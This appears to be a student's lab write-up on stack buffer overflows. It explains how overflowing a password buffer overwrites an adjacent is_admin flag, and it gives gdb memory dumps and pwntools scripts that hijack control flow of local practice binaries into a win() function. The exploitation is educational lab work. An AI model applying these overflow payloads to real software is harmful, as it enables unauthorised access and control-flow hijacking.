# Laborator 2

## Solution to [Q1]:
If I have a boolean `is_admin` and an input buffer that stores a name, and I input more characters than the buffer can hold, the overflow could overwrite the `is_admin` value in memory. This might set `is_admin` to `true`, potentially giving unauthorized admin access.

## Solution to [Q2]:
The `password` buffer is 8 characters long, but if we enter more than 8 characters (for example, `aaaaaaaa1`), the extra character (`1`) overflows the buffer and can overwrite the adjacent `is_admin` variable in memory. This sets `is_admin` to `1`, which the program interprets as granting admin access, bypassing the password check.

## Solution to [Q3]:
```
$ make ex1
$ echo -n 'aaaaaaaa1' > input
$ gdb -q
pwndbg> file ./bin/ex1
pwndbg> b main
pwndbg> run < input
pwndbg> n
pwndbg> n
pwndbg> x/10gx $rsp
```

```python
0x7fffffffdca0: 0x6161616161616161      0x0000000000000031
0x7fffffffdcb0: 0x00007fffffffdd50      0x00007ffff7dcf1ca
0x7fffffffdcc0: 0x00007fffffffdd00      0x00007fffffffddd8
0x7fffffffdcd0: 0x0000000100400040      0x0000000000401176
0x7fffffffdce0: 0x00007fffffffddd8      0x9de42ea233c29359
```

At address `0x7fffffffdca0`, we see the `password` buffer containing `0x6161616161616161` (which represents "aaaaaaaa"). In the next 8 bytes, at `0x7fffffffdca8`, we find `0x0000000000000031`, which corresponds to `is_admin`. This has been modified to a non-zero value (`1`), indicating that our overflow was successful.

## Solution to [Q4]:
```python
#!/usr/bin/env python3

from pwn import *

target = process("./bin/ex2")

payload = b"A" * 8 + p64(0xDEADBEEF)
print(payload)

target.send(payload)
target.interactive()
```

```
[+] Starting local process './bin/ex2': pid 962
b'AAAAAAAA\xef\xbe\xad\xde'
[*] Switching to interactive mode
```

```
$ echo -ne 'AAAAAAAA\xef\xbe\xad\xde' | ./bin/ex2
Access granted!
```

## Solution to [Q5]:
```python
from pwn import *
import os

context.binary = './bin/ex3'
pattern = cyclic(100)
p = process('./bin/ex3')
p.sendline(pattern)
p.wait()
core_path = f"/tmp/core.{os.path.basename(context.binary.path)}.{p.pid}.11"
core = Core(core_path)
crash_addr = core.fault_addr

offset = cyclic_find(crash_addr)
print("Offset: ", offset)
```
```
Offset:  56
```

```
$ gdb ./bin/ex3
pwndbg> p win
$1 = {int ()} 0x401156 <win>
```

```python
from pwn import *

exe = './bin/ex3'
p = process(exe)

win_addr = p64(0x401156)
padding = b'A' * 56
payload = padding + win_addr

p.sendline(payload)
p.interactive()
```